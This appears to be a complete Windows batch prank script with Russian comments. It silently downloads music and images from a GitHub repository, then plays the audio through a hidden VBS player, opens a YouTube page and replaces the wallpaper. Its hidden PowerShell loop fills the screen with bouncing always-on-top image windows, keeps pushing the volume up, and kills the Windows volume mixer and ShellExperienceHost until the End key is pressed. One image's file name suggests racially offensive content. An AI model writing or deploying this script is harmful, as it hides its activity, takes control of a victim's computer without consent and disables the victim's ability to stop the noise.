@echo off
chcp 65001 >nul

:: --- НАСТРОЙКИ ---
set "SITE_URL=https://www.youtube.com/watch?v=iGTQHchdneQ"
set "MUSIC_URL=https://raw.githubusercontent.com/Pecennn/testik/main/myzika.mp4"
set "BASE_RAW=https://raw.githubusercontent.com/Pecennn/testik/main"
set "PHOTOS=a4.png kani.png lenin.png lev.png mge.png noshka.png shrek.png svin.png negritos.png"
set "WALL_URL=https://raw.githubusercontent.com/Pecennn/testik/main/%%D0%%BA%%D0%%BE%%D0%%BD%%D1%%8C.png"

:: [1/3] Загрузка ресурсов (в скрытом режиме)
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%MUSIC_URL%', '%temp%\bg_music.mp4'); (New-Object Net.WebClient).DownloadFile('%WALL_URL%', '%temp%\h.png')"
for %%f in (%PHOTOS%) do (
    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%BASE_RAW%/%%f', '%temp%\%%f')"
)

:: [2/3] Музыка и обои
(echo Set P = CreateObject^("WMPlayer.OCX"^): P.URL="%temp%\bg_music.mp4": P.Controls.play: do while P.currentmedia.duration=0: wscript.sleep 10: loop: wscript.sleep 300000) > "%temp%\s.vbs"
start /b wscript.exe "%temp%\s.vbs"
start "" "%SITE_URL%"
powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int a, int b, string c, int d); }'; [W]::SystemParametersInfo(20, 0, '%temp%\h.png', 3)"

:: [3/3] ЗАПУСК ЦЕНТРАЛЬНОГО ПРОЦЕССА (ПОЛНОЕ СКРЫТИЕ)
:: Добавлен флаг -WindowStyle Hidden
start /b powershell -WindowStyle Hidden -Command "$w=New-Object -ComObject WScript.Shell; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $ph='%PHOTOS%'.Split(' '); $fs=New-Object System.Collections.Generic.List[PSObject]; $sc=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; foreach($p in $ph){ $path=Join-Path $env:TEMP $p; if(Test-Path $path){ try{ $img=[System.Drawing.Image]::FromFile($path); $f=New-Object System.Windows.Forms.Form; $f.FormBorderStyle='None'; $f.StartPosition='Manual'; $f.TopMost=$true; $f.ShowInTaskbar=$false; $f.Width=350; $f.Height=[int](350*($img.Height/$img.Width)); $f.BackgroundImage=$img; $f.BackgroundImageLayout='Stretch'; $o=[PSCustomObject]@{F=$f;X=(Get-Random -Min 0 -Max ($sc.Width-350));Y=(Get-Random -Min 0 -Max ($sc.Height-350));DX=(15+(Get-Random -Min 1 -Max 5));DY=(15+(Get-Random -Min 1 -Max 5))}; $fs.Add($o); $f.Show() }catch{} } }; $API=Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int v);' -Name 'W32' -PassThru; $tick=0; while($true){ if($API::GetAsyncKeyState(35) -ne 0){ break }; $tick++; if($tick -ge 5){ $w.SendKeys([char]175); Stop-Process -Name SndVol, ShellExperienceHost -ErrorAction SilentlyContinue; $tick=0 }; foreach($o in $fs){ $o.X+=$o.DX; $o.Y+=$o.DY; if($o.X -le 0 -or $o.X+$o.F.Width -ge $sc.Width){$o.DX=-$o.DX}; if($o.Y -le 0 -or $o.Y+$o.F.Height -ge $sc.Height){$o.DY=-$o.DY}; $o.F.Location=New-Object System.Drawing.Point($o.X,$o.Y) }; [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -m 20 }"

exit